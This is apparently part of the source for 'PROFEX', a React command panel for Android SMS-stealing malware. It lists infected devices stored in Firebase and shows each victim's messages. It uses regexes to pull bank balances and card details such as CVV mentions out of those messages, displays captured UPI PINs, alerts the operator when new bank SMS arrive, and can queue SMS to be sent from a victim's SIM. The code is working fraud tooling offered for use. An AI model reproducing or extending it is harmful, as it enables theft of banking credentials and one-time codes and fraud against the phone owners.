    function DevicePanel({ device: dev, fbUrl, fbKey, onClose, onDelete, showToast }) {
      const [messages, setMessages] = useState([]);
      const [analysis, setAnalysis] = useState({ bankBalances: [], cards: [], phoneNumbers: [], networks: [] });
      const [loadingMsgs, setLoadingMsgs] = useState(true);
      const [activeTab, setActiveTab] = useState('info');
      const [sendTo, setSendTo] = useState('');
      const [sendMsg, setSendMsg] = useState('');
      const [sendSim, setSendSim] = useState(1);
      const [sending, setSending] = useState(false);
      const intervalRef = useRef(null);

      const loadMessages = useCallback(async () => {
        try {
          const raw = await fbGet(fbUrl, fbKey, `messages/${dev.id}`);
          const msgs = parseSmsMessages(raw);
          setMessages(msgs); setAnalysis(buildSmsAnalysis(msgs));
        } catch (e) {
          if (e.message.includes('PERMISSION_DENIED')) showToast('Firebase permission denied — check your Database Secret key');
          setMessages([]);
        } finally { setLoadingMsgs(false); }
      }, [dev.id, fbUrl, fbKey, showToast]);

      useEffect(() => {
        loadMessages();
        intervalRef.current = setInterval(async () => {
          try {
            const raw = await fbGet(fbUrl, fbKey, `messages/${dev.id}`);
            const msgs = parseSmsMessages(raw);
            setMessages(prev => {
              if (JSON.stringify(msgs.map(m => m.text)) !== JSON.stringify(prev.map(m => m.text))) {
                const a = buildSmsAnalysis(msgs); setAnalysis(a);
                if (a.bankBalances.length > 0) showToast('New bank SMS detected'); else showToast('New message received');
                return msgs;
              }
              return prev;
            });
          } catch {}
        }, 6000);
        return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
      }, [loadMessages]);

      const sendSms = async () => {
        if (!sendTo || !sendMsg) { showToast('Fill number and message'); return; }
        setSending(true);
        try {
          await fbPut(fbUrl, fbKey, `clients/${dev.id}/webhookEvent/sendSms`, { from: sendSim, to: sendTo, message: sendMsg, isSended: false });
          showToast('SMS queued!'); setSendMsg('');
        } catch (e) {
          showToast(e.message.includes('PERMISSION_DENIED') ? 'Firebase permission denied — cannot send' : 'Send failed');
        } finally { setSending(false); }
      };

      const deleteDevice = async () => {
        if (!confirm(`Delete "${dev.name}" permanently?`)) return;
        try { await fbDelete(fbUrl, fbKey, `clients/${dev.id}`); showToast('Device deleted'); onDelete(); }
        catch (e) { showToast(e.message.includes('PERMISSION_DENIED') ? 'Firebase permission denied' : 'Delete failed'); }
      };

      const batColor = dev.batteryPercent >= 60 ? '#86efac' : dev.batteryPercent >= 30 ? '#fde68a' : '#ef4444';
      const phone = dev.phoneNumber !== '—' ? dev.phoneNumber : analysis.phoneNumbers[0] || '—';
      const network = dev.provider !== '—' ? dev.provider : analysis.networks[0] || '—';

      const tabs = [
        { key: 'info', label: 'Info' },
        { key: 'bank', label: `Bank (${analysis.bankBalances.length})` },
        ...(analysis.cards.length > 0 ? [{ key: 'card', label: `Card (${analysis.cards.length})` }] : []),
        { key: 'sms', label: `SMS (${messages.length})` },
        { key: 'send', label: 'Send' },
      ];

      return (
        <div className="fixed inset-0 z-50 flex" onClick={onClose}>
          <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
          <div className="relative ml-auto w-full max-w-md h-full flex flex-col bg-[#0d0d0d] border-l border-[#1f1f1f] shadow-2xl" onClick={e => e.stopPropagation()}>
            {/* Header */}
            <div className="flex items-center justify-between px-5 py-4 border-b border-[#1a1a1a]">
              <div className="flex items-center gap-3">
                <div className={`w-9 h-9 rounded-xl flex items-center justify-center ${dev.status ? 'bg-emerald-500/15 border border-emerald-500/25' : 'bg-[#1a1a1a] border border-[#262626]'}`}>
                  <Icon name="Smartphone" className={`w-4 h-4 ${dev.status ? 'text-emerald-400' : 'text-[#444]'}`} />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-white">{dev.name}</h3>
                  <p className="text-[10px] font-mono text-[#555] mt-0.5">{dev.id}</p>
                  {dev.serverName && <p className="text-[9px] text-[#333] mt-0.5">{dev.serverName}</p>}
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button onClick={deleteDevice} className="p-2 rounded-xl bg-red-950/40 border border-red-900/30 text-red-400 hover:bg-red-950/70 transition-colors">
                  <Icon name="Trash2" className="w-4 h-4" />
                </button>
                <button onClick={onClose} className="p-2 rounded-xl bg-[#1a1a1a] border border-[#262626] text-[#888] hover:text-white transition-colors">
                  <Icon name="X" className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Status bar */}
            <div className="flex items-center gap-3 px-5 py-2.5 bg-[#0a0a0a] border-b border-[#1a1a1a] flex-wrap">
              <div className="flex items-center gap-1.5">
                <span className={`w-2 h-2 rounded-full ${dev.status ? 'bg-emerald-500' : 'bg-[#333]'}`} style={dev.status ? { boxShadow: '0 0 6px #22c55e' } : {}} />
                <span className={`text-xs font-semibold ${dev.status ? 'text-emerald-400' : 'text-[#555]'}`}>{dev.status ? 'Online' : 'Offline'}</span>
                {!dev.status && dev.lastSeen && <span className="text-[10px] font-mono text-red-400/70">since {timeAgo(dev.lastSeen)}</span>}
              </div>
              <div className="flex items-center gap-1">
                <span className="text-[10px] text-[#555]">Bat</span>
                <span className="text-[10px] font-bold" style={{ color: batColor }}>{dev.battery}</span>
              </div>
              {dev.upipin && <span className="px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400">UPI: {dev.upipin.split('|')[0]}</span>}
              {analysis.bankBalances.length > 0 && <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-[10px] font-semibold text-emerald-400">{analysis.bankBalances.length} Bank SMS</span>}
              {analysis.cards.length > 0 && <span className="px-2 py-0.5 rounded-full bg-purple-500/10 border border-purple-500/20 text-[10px] font-semibold text-purple-400">{analysis.cards.length} Card</span>}
            </div>

            {/* Tabs */}
            <div className="flex border-b border-[#1a1a1a] px-2 overflow-x-auto flex-shrink-0">
              {tabs.map(t => (
                <button key={t.key} onClick={() => setActiveTab(t.key)}
                  className={`px-3 py-3 text-[11px] font-semibold border-b-2 whitespace-nowrap transition-all ${activeTab === t.key ? t.key === 'bank' ? 'border-emerald-500 text-emerald-400' : t.key === 'card' ? 'border-purple-500 text-purple-400' : 'border-red-500 text-red-400' : 'border-transparent text-[#555] hover:text-[#888]'}`}>
                  {t.label}
                </button>
              ))}
            </div>

            {/* Tab content */}
            <div className="flex-1 overflow-y-auto">
              {activeTab === 'info' && (
                <div className="px-5 py-4">
                  {!dev.status && dev.lastSeen && (
                    <div className="mb-4 p-3 rounded-xl bg-red-950/20 border border-red-900/30 border-l-2 border-l-red-500/60">
                      <p className="text-[9px] uppercase tracking-widest text-red-700 mb-1 font-semibold">Last Seen (Offline Since)</p>
                      <p className="text-base font-black text-red-400">{timeAgo(dev.lastSeen)}</p>
                      <p className="text-[10px] font-mono text-red-700/70 mt-0.5">{formatDatetime(dev.lastSeen)}</p>
                    </div>
                  )}
                  {dev.status && dev.lastSeen && (
                    <div className="mb-4 p-3 rounded-xl bg-emerald-950/20 border border-emerald-900/30">
                      <p className="text-[9px] uppercase tracking-widest text-emerald-700 mb-1 font-semibold">Last Activity</p>
                      <p className="text-[11px] font-mono text-emerald-500">{formatDatetime(dev.lastSeen)}</p>
                    </div>
                  )}
                  <p className="text-[10px] uppercase tracking-widest text-[#444] mb-3 font-semibold">Device</p>
                  <InfoRow label="Phone Number" value={phone} mono />
                  <InfoRow label="Network" value={network} />
                  <InfoRow label="Android" value={dev.android} />
                  <InfoRow label="IP Address" value={dev.ip} mono />
                  <InfoRow label="Storage" value={dev.storage} />
                  <InfoRow label="CPU Arch" value={dev.cpu} mono />
                  <InfoRow label="SDK Version" value={dev.sdk} />
                  <InfoRow label="SIM Cards" value={`${dev.sims.length} SIM(s)`} />
                  {dev.sims.map((s, i) => s.phoneNumber ? <InfoRow key={i} label={`SIM ${i+1} Number`} value={s.phoneNumber} mono /> : null)}
                  {analysis.phoneNumbers.length > 0 && (
                    <>
                      <p className="text-[10px] uppercase tracking-widest text-[#444] mt-4 mb-3 font-semibold">From SMS</p>
                      {analysis.phoneNumbers.map((p, i) => <InfoRow key={i} label={`Phone #${i+1}`} value={p} mono highlight="text-blue-400" />)}
                    </>
                  )}
                  {analysis.networks.map((n, i) => <InfoRow key={i} label={`Network #${i+1}`} value={n} highlight="text-purple-400" />)}
                </div>
              )}

              {activeTab === 'bank' && (
                <div className="flex flex-col h-full">
                  <div className="flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]">
                    <div>
                      <span className="text-xs text-[#555]">Auto-detected from {messages.length} SMS</span>
                      {analysis.bankBalances.length > 0 && <p className="text-[10px] text-emerald-600/70 mt-0.5">{analysis.bankBalances.length} bank message(s) found</p>}
                    </div>
                    <button onClick={loadMessages} className="p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors"><Icon name="RefreshCw" className="w-3.5 h-3.5" /></button>
                  </div>
                  <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2">
                    {loadingMsgs ? (
                      <div className="py-12 text-center"><div className="w-6 h-6 border-2 border-[#333] border-t-red-500 rounded-full animate-spin mx-auto mb-3" /><p className="text-xs text-[#555]">Loading…</p></div>
                    ) : analysis.bankBalances.length === 0 ? (
                      <div className="py-12 text-center"><Icon name="Banknote" className="w-10 h-10 mx-auto mb-3 text-[#2a2a2a]" /><p className="text-sm font-medium text-[#444]">No bank SMS found</p></div>
                    ) : analysis.bankBalances.map((b, i) => <BankCard key={i} b={b} />)}
                  </div>
                </div>
              )}

              {activeTab === 'card' && (
                <div className="flex flex-col h-full">
                  <div className="flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]">
                    <span className="text-xs text-[#555]">Card info from SMS</span>
                    <button onClick={loadMessages} className="p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors"><Icon name="RefreshCw" className="w-3.5 h-3.5" /></button>
                  </div>
                  <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2">
                    {loadingMsgs ? (
                      <div className="py-12 text-center"><div className="w-6 h-6 border-2 border-[#333] border-t-red-500 rounded-full animate-spin mx-auto mb-3" /></div>
                    ) : analysis.cards.length === 0 ? (
                      <div className="py-12 text-center"><Icon name="CreditCard" className="w-10 h-10 mx-auto mb-3 text-[#2a2a2a]" /><p className="text-sm font-medium text-[#444]">No card info found</p></div>
                    ) : analysis.cards.map((c, i) => <CardItem key={i} c={c} />)}
                  </div>
                </div>
              )}

              {activeTab === 'sms' && (
                <div className="flex flex-col h-full">
                  <div className="flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]">
                    <span className="text-xs text-[#555]">Last 2 hrs only · auto-refreshes</span>
                    <button onClick={loadMessages} className="p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors"><Icon name="RefreshCw" className="w-3.5 h-3.5" /></button>
                  </div>
                  <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2">
                    {loadingMsgs ? (
                      <div className="py-12 text-center"><div className="w-6 h-6 border-2 border-[#333] border-t-red-500 rounded-full animate-spin mx-auto mb-3" /><p className="text-xs text-[#555]">Loading messages…</p></div>
                    ) : messages.length === 0 ? (
                      <div className="py-12 text-center"><Icon name="MessageSquare" className="w-10 h-10 mx-auto mb-3 text-[#2a2a2a]" /><p className="text-sm font-medium text-[#444]">No messages</p></div>
                    ) : messages.map((m, i) => {
                      const isBank = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text);
                      const isCard = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(m.text);
                      const leftColor = isCard ? 'border-l-purple-600/60' : isBank ? 'border-l-emerald-600/60' : 'border-l-red-600/60';
                      const bg = isCard ? 'bg-[#100d18]' : isBank ? 'bg-[#0a130d]' : 'bg-[#111]';
                      const senderColor = isCard ? 'text-purple-400' : isBank ? 'text-emerald-400' : 'text-red-400';
                      return (
                        <div key={i} className={`p-3 rounded-xl border border-[#1e1e1e] border-l-2 ${leftColor} ${bg}`}>
                          <div className="flex items-center justify-between mb-2">
                            <div className="flex items-center gap-1.5">
                              <span className={`text-xs font-bold ${senderColor}`}>{m.sender}</span>
                              {isBank && <Icon name="Banknote" className="w-3 h-3 text-emerald-600/70" />}
                              {isCard && <Icon name="CreditCard" className="w-3 h-3 text-purple-600/70" />}
                            </div>
                            <span className="text-[10px] text-[#444] font-mono">{m.time}</span>
                          </div>
                          <p className="text-xs text-[#aaa] leading-relaxed">{m.text.substring(0, 250)}</p>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}

              {activeTab === 'send' && (
                <div className="px-5 py-4 space-y-4">
                  <div>
                    <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Select SIM</p>
                    <div className="flex gap-2">
                      {[1,2].map(sim => (
                        <button key={sim} onClick={() => setSendSim(sim)} className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all ${sendSim === sim ? 'bg-red-600 text-white shadow-lg shadow-red-900/40' : 'bg-[#111] border border-[#222] text-[#666] hover:border-[#333] hover:text-[#888]'}`}>
                          SIM {sim}
                        </button>
                      ))}
                    </div>
                  </div>
                  <div>
                    <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Recipient</p>
                    <input type="text" value={sendTo} onChange={e => setSendTo(e.target.value)} placeholder="+919876543210" className="w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] font-mono transition-all" />
                  </div>
                  <div>
                    <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Message</p>
                    <textarea value={sendMsg} onChange={e => setSendMsg(e.target.value)} rows={4} placeholder="Type your message here…" className="w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] resize-none transition-all" />
                    <p className="text-[10px] text-[#444] mt-1 text-right">{sendMsg.length} chars</p>
                  </div>
                  <button onClick={sendSms} disabled={sending} className="w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-red-600 hover:bg-red-700 text-white font-bold text-sm shadow-lg shadow-red-900/40 transition-all disabled:opacity-50 disabled:cursor-not-allowed">
                    {sending ? <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <Icon name="Send" className="w-4 h-4" />}
                    {sending ? 'Sending…' : `Send via SIM ${sendSim}`}
                  </button>
                  {phone !== '—' && (
                    <button onClick={() => setSendTo(phone)} className="w-full py-2.5 rounded-xl border border-[#222] bg-[#111] text-xs text-[#666] hover:text-[#888] hover:border-[#333] transition-all">
                      Use device number: <span className="font-mono text-[#888]">{phone}</span>
                    </button>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      );
    }

    // ─── Dashboard ────────────────────────────────────────────────────────────────
    const SERVER_COLORS_MAP = {};

    function Dashboard({ servers, onLogout, onBackToConnect }) {
      const [devices, setDevices] = useState([]);
      const [loading, setLoading] = useState(true);
      const [selectedDevice, setSelectedDevice] = useState(null);
      const [filter, setFilter] = useState('all');
      const [sort, setSort] = useState('new');
      const [search, setSearch] = useState('');
      const [error, setError] = useState('');
      const [toasts, setToasts] = useState([]);
      const [time, setTime] = useState(new Date());
      const [serverErrors, setServerErrors] = useState({});
      const [popupMsg, setPopupMsg] = useState(null);
      const prevCountRef = useRef(0);
      const smsLoadedRef = useRef(new Set());
      const fetchIntervalRef = useRef(null);
      const smsIntervalRef = useRef(null);
      const smsCleanupRef = useRef(null);
      const popupQueueRef = useRef([]);
      const popupTimerRef = useRef(null);
      const lastMsgKeyRef = useRef({});

      servers.forEach((s, i) => {
        const colors = ['#ef4444','#f97316','#eab308','#22c55e','#06b6d4','#3b82f6','#a855f7','#ec4899','#14b8a6','#84cc16'];
        SERVER_COLORS_MAP[s.id] = s.color || colors[i % colors.length];
      });

      const showToast = useCallback((text) => {
        const id = Date.now();
        setToasts(prev => [...prev, { id, text }]);
        setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 3500);
      }, []);

      // ── SMS Popup queue logic (ref-based to avoid stale closures) ──
      const isShowingRef = useRef(false);
      const advancePopup = useRef(null);
      advancePopup.current = () => {
        if (popupTimerRef.current) clearTimeout(popupTimerRef.current);
        if (popupQueueRef.current.length === 0) { isShowingRef.current = false; setPopupMsg(null); return; }
        const next = popupQueueRef.current.shift();
        isShowingRef.current = true;
        setPopupMsg({ ...next, exiting: false });
        popupTimerRef.current = setTimeout(() => {
          setPopupMsg(prev => prev ? { ...prev, exiting: true } : null);
          popupTimerRef.current = setTimeout(() => advancePopup.current(), 350);
        }, 4500);
      };
      const enqueuePopup = useCallback((msg) => {
        popupQueueRef.current.push(msg);
        if (!isShowingRef.current) advancePopup.current();
      }, []);

      const loadAllDevices = useCallback(async (silent = false) => {
        const errs = {};
        const allDevices = [];
        await Promise.all(servers.map(async server => {
          try {
            const raw = await fbGet(server.url, server.key, 'clients');
            const devs = parseDevices(raw, server.id, server.name);
            allDevices.push(...devs);
          } catch (e) {
            const msg = e.message;
            if (msg.includes('PERMISSION_DENIED') || msg.includes('401') || msg.includes('403')) errs[server.id] = `Permission Denied — Use Database Secret key for "${server.name}"`;
            else if (msg.includes('NOT_FOUND') || msg.includes('404')) errs[server.id] = `Database path not found for "${server.name}"`;
            else errs[server.id] = `Error: ${msg.slice(0, 80)}`;
          }
        }));
        setServerErrors(errs);
        if (Object.keys(errs).length === 0) setError('');
        else if (allDevices.length === 0) setError(Object.values(errs)[0]);
        setDevices(prev => {
          const map = new Map(prev.map(d => [d.id + '_' + d.serverId, d.smsAnalysis]));
          return allDevices.map(d => ({ ...d, smsAnalysis: map.get(d.id + '_' + d.serverId) }));
        });
        if (!silent) setLoading(false);
        if (prevCountRef.current > 0 && allDevices.length > prevCountRef.current) showToast('🔔 New device connected!');
        prevCountRef.current = allDevices.length;
      }, [servers, showToast]);

      const loadSmsForDevices = useCallback(async (devList, forceReload = false) => {
        const toLoad = devList.filter(d => forceReload || !smsLoadedRef.current.has(d.id + '_' + d.serverId));
        if (toLoad.length === 0) return;
        // Load ALL devices in parallel — no sequential batching, so data is ready before user scrolls
        await Promise.all(toLoad.map(async dev => {
          const server = servers.find(s => s.id === dev.serverId); if (!server) return;
          try {
            const raw = await fbGet(server.url, server.key, `messages/${dev.id}`, { orderBy: '"$key"', limitToLast: '150' });
            const msgs = parseSmsMessages(raw);
            const analysis = buildSmsAnalysis(msgs);
            setDevices(prev => prev.map(d => d.id === dev.id && d.serverId === dev.serverId ? { ...d, smsAnalysis: analysis, _rawMsgs: msgs } : d));
            setSelectedDevice(prev => prev?.id === dev.id && prev?.serverId === dev.serverId ? { ...prev, smsAnalysis: analysis } : prev);
            smsLoadedRef.current.add(dev.id + '_' + dev.serverId);
          } catch {}
        }));
      }, [servers]);

      useEffect(() => {
        loadAllDevices(false);
        fetchIntervalRef.current = setInterval(() => loadAllDevices(true), 15000);

        // Reload SMS for online devices every 30s — powers popup detection + 2-hour auto-removal
        smsIntervalRef.current = setInterval(() => {
          setDevices(current => {
            const onlineDevs = current.filter(d => d.status);
            if (onlineDevs.length > 0) loadSmsForDevices(onlineDevs, true);
            // Also load unloaded offline devices
            const unloaded = current.filter(d => !d.status && !smsLoadedRef.current.has(d.id + '_' + d.serverId));
            if (unloaded.length > 0) loadSmsForDevices(unloaded, false);
            return current;
          });
        }, 30000);

        // Every 2 min: force-reload ALL devices SMS to purge messages older than 2 hrs
        smsCleanupRef.current = setInterval(() => {
          smsLoadedRef.current.clear();
          setDevices(current => { loadSmsForDevices(current, true); return current; });
        }, 2 * 60 * 1000);

        const clockInterval = setInterval(() => setTime(new Date()), 1000);
        return () => {
          if (fetchIntervalRef.current) clearInterval(fetchIntervalRef.current);
          if (smsIntervalRef.current) clearInterval(smsIntervalRef.current);
          if (smsCleanupRef.current) clearInterval(smsCleanupRef.current);
          if (popupTimerRef.current) clearTimeout(popupTimerRef.current);
          clearInterval(clockInterval);
        };
      }, []);

      useEffect(() => { if (devices.length > 0) loadSmsForDevices(devices); }, [devices.length]);

      // Detect new messages on online devices → enqueue popups
      useEffect(() => {
        devices.forEach(d => {
          if (!d.status || !d._rawMsgs || d._rawMsgs.length === 0) return;
          const key = d.id + '_' + d.serverId;
          const latestText = d._rawMsgs[0]?.text;
          if (!latestText) return;
          const prev = lastMsgKeyRef.current[key];
          if (prev !== undefined && prev !== latestText) {
            // New message arrived for this online device
            enqueuePopup({ deviceName: d.name, sender: d._rawMsgs[0].sender, text: d._rawMsgs[0].text, status: d.status, device: d });
          }
          lastMsgKeyRef.current[key] = latestText;
        });
      }, [devices]);

      const filtered = devices.filter(d => {
        if (filter === 'favorite') return isFavorite(d.id, d.serverId);
        if (filter === 'online' && !d.status) return false;
        if (filter === 'offline' && d.status) return false;
        if (filter === 'upi' && !d.upipin) return false;
        if (filter === 'bank' && !d.smsAnalysis?.bankBalances.length) return false;
        if (filter === 'card' && !d.smsAnalysis?.cards.length) return false;
        if (!['all','online','offline','upi','bank','card'].includes(filter)) {
          if (d.serverId !== parseInt(filter)) return false;
        }
        const q = search.toLowerCase();
        if (q && !d.name.toLowerCase().includes(q) && !d.phoneNumber.includes(q) && !d.id.includes(q)) return false;
        return true;
      }).sort((a, b) => {
        // Favorites always first
        const aFav = isFavorite(a.id, a.serverId);
        const bFav = isFavorite(b.id, b.serverId);
        if (aFav && !bFav) return -1;
        if (!aFav && bFav) return 1;
        if (sort === 'name') return a.name.localeCompare(b.name);
        if (sort === 'battery') return b.batteryPercent - a.batteryPercent;
        if (sort === 'old') return a.id.localeCompare(b.id);
        return b.id.localeCompare(a.id);
      });

      const online = devices.filter(d => d.status).length;
      const offline = devices.length - online;
      const bankCount = devices.filter(d => d.smsAnalysis?.bankBalances.length).length;
      const cardCount = devices.filter(d => d.smsAnalysis?.cards.length).length;
      const timeStr = time.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false });
      const selectedServer = selectedDevice ? servers.find(s => s.id === selectedDevice.serverId) : null;

      return (
        <div className="min-h-screen bg-[#080808] text-white flex flex-col">
          {/* Header */}
          <header className="sticky top-0 z-40 bg-[#0a0a0a]/95 backdrop-blur-md border-b border-[#1a1a1a]">
            <div className="max-w-screen-2xl mx-auto px-4 sm:px-6 py-3 flex items-center gap-4">
              <div className="flex items-center gap-2 flex-shrink-0">
                <div className="w-7 h-7 rounded-lg red-gradient flex items-center justify-center shadow-lg shadow-red-900/50">
                  <Icon name="Shield" className="w-3.5 h-3.5 text-white" />
                </div>
                <span className="font-bold italic text-lg" style={{ fontFamily: "'Segoe UI', Roboto, Arial, sans-serif" }}>
                  <span className="text-[#6acfff]">P</span>ROFE<span className="relative">X<span className="absolute -top-1 -right-1 w-1.5 h-1.5 bg-[#6acfff] rounded-full animate-glint" /></span>
                </span>
              </div>

              <div className="relative flex-1 max-w-sm">
                <Icon name="Search" className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#444]" />
                <input type="text" value={search} onChange={e => setSearch(e.target.value)} placeholder="Search devices…" className="w-full pl-9 pr-4 py-2 rounded-xl bg-[#111] border border-[#222] focus:border-[#333] outline-none text-sm text-white placeholder:text-[#444] transition-all" />
              </div>

              <div className="ml-auto flex items-center gap-2 sm:gap-3">
                <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-950/40 border border-emerald-900/40">
                  <span className="w-2 h-2 rounded-full bg-emerald-500" style={{ boxShadow: '0 0 6px #22c55e' }} />
                  <span className="text-xs font-semibold text-emerald-400">{servers.length} Server{servers.length !== 1 ? 's' : ''}</span>
                </div>
                <a href="https://t.me/BERLIN_00_11" target="_blank" rel="noopener noreferrer">
                  <span className="glow-wave inline-block">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="#0088cc" className="w-7 h-7">
                      <path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z" />
                    </svg>
                  </span>
                </a>
                <div className="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-[#111] border border-[#1e1e1e]">
                  <Icon name="Clock" className="w-3.5 h-3.5 text-[#555]" />
                  <span className="text-xs font-mono font-bold text-[#888]">{timeStr}</span>
                </div>
                <button onClick={onBackToConnect} className="p-1.5 rounded-xl border border-[#222] bg-[#111] text-[#555] hover:text-[#888] hover:border-[#333] transition-all" title="Manage servers">
                  <Icon name="Database" className="w-3.5 h-3.5" />
                </button>
                <button onClick={() => { if (confirm('Logout?')) onLogout(); }} className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl border border-[#222] bg-[#111] text-xs text-[#666] hover:text-red-400 hover:border-red-900/40 transition-all">
                  <Icon name="LogOut" className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">Logout</span>
                </button>
              </div>
            </div>
          </header>

          {/* Error bar */}
          {error && (
            <div className="flex items-start gap-3 px-4 py-3 bg-red-950/40 border border-red-900/30 rounded-xl mx-4 sm:mx-6 mt-3">
              <Icon name="AlertTriangle" className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
              <p className="text-xs text-red-300 flex-1 leading-relaxed">{error}</p>
              <button onClick={() => setError('')} className="text-red-600 hover:text-red-400 flex-shrink-0"><Icon name="X" className="w-3.5 h-3.5" /></button>
            </div>
          )}

          {/* Server status row */}
          {servers.length > 1 && (
            <div className="max-w-screen-2xl mx-auto w-full px-4 sm:px-6 pt-3">
              <div className="flex items-center gap-2 flex-wrap">
                {servers.map(s => {
                  const hasErr = !!serverErrors[s.id];
                  const devCount = devices.filter(d => d.serverId === s.id).length;
                  return (
                    <div key={s.id} className={`flex items-center gap-1.5 px-2.5 py-1 rounded-full border text-[10px] font-semibold ${hasErr ? 'bg-red-950/20 border-red-900/30 text-red-400' : 'bg-[#111] border-[#1e1e1e] text-[#555]'}`}>
                      <span className="w-1.5 h-1.5 rounded-full" style={{ background: SERVER_COLORS_MAP[s.id] }} />
                      {s.name} ({devCount})
                      {hasErr && <Icon name="AlertTriangle" className="w-3 h-3 text-red-400" />}
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* Stats + filters bar */}
          <div className="border-b border-[#1a1a1a] bg-[#0a0a0a] mt-3">
            <div className="max-w-screen-2xl mx-auto px-4 sm:px-6 py-3 flex items-center gap-4 sm:gap-6 flex-wrap">
              <div className="flex items-center gap-4 sm:gap-5">
                {[
                  { label: 'Total', value: devices.length, color: 'text-white' },
                  { label: 'Online', value: online, color: 'text-emerald-400' },
                  { label: 'Offline', value: offline, color: 'text-[#555]' },
                  { label: 'Bank SMS', value: bankCount, color: 'text-emerald-400' },
                  ...(cardCount > 0 ? [{ label: 'Cards', value: cardCount, color: 'text-purple-400' }] : []),
                ].map(s => (
                  <div key={s.label}>
                    <p className="text-[9px] uppercase tracking-widest text-[#444] font-semibold">{s.label}</p>
                    <p className={`text-lg font-black ${s.color}`}>{s.value}</p>
                  </div>
                ))}
              </div>

              <div className="ml-auto flex items-center gap-2 flex-wrap">
                {['all','online','offline','upi','bank','card'].map(f => (
                  <button key={f} onClick={() => setFilter(f)}
                    className={`px-2.5 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${filter === f ? f === 'bank' ? 'bg-emerald-600/20 text-emerald-400 border border-emerald-600/30' : f === 'card' ? 'bg-purple-600/20 text-purple-400 border border-purple-600/30' : 'bg-red-600/20 text-red-400 border border-red-600/30' : 'text-[#555] hover:text-[#888]'}`}>
                    {f}
                  </button>
                ))}
                {servers.length > 1 && servers.map((s, i) => (
                  <button key={s.id} onClick={() => setFilter(filter === String(s.id) ? 'all' : String(s.id))}
                    className={`px-2 py-1 rounded-full text-[10px] font-bold transition-all border ${filter === String(s.id) ? 'text-white border-[#333]' : 'text-[#444] border-[#1e1e1e] hover:text-[#666]'}`}
                    style={{ borderColor: filter === String(s.id) ? SERVER_COLORS_MAP[s.id] : undefined, color: filter === String(s.id) ? SERVER_COLORS_MAP[s.id] : undefined }}>
                    S{i+1}
                  </button>
                ))}
                <div className="w-px h-4 bg-[#222]" />
                <select value={sort} onChange={e => setSort(e.target.value)} className="bg-[#111] border border-[#222] text-xs text-[#666] rounded-lg px-2 py-1.5 outline-none">
                  <option value="new">Newest</option>
                  <option value="old">Oldest</option>
                  <option value="name">Name</option>
                  <option value="battery">Battery</option>
                </select>
                <button onClick={() => loadAllDevices(false)} className="p-2 rounded-lg bg-[#111] border border-[#222] text-[#555] hover:text-[#888] hover:border-[#333] transition-all">
                  <Icon name="RefreshCw" className="w-3.5 h-3.5" />
                </button>
                <button onClick={() => setFilter(filter === 'favorite' ? 'all' : 'favorite')}
                  className={`flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-semibold transition-all ${filter === 'favorite' ? 'bg-yellow-600/20 text-yellow-400 border border-yellow-600/30' : 'text-[#555] hover:text-[#888]'}`}>
                  <Icon name="Star" className="w-3.5 h-3.5" />
                  Favorites
                </button>
              </div>
            </div>
          </div>

          {/* Main content */}
          <main className="flex-1 max-w-screen-2xl mx-auto w-full px-4 sm:px-6 py-6">
            {loading ? (
              <div>
                <div className="flex items-center gap-3 mb-5">
                  <div className="w-4 h-4 border-2 border-[#333] border-t-red-500 rounded-full animate-spin" />
                  <span className="text-sm text-[#555]">Connecting to Firebase…</span>
                </div>
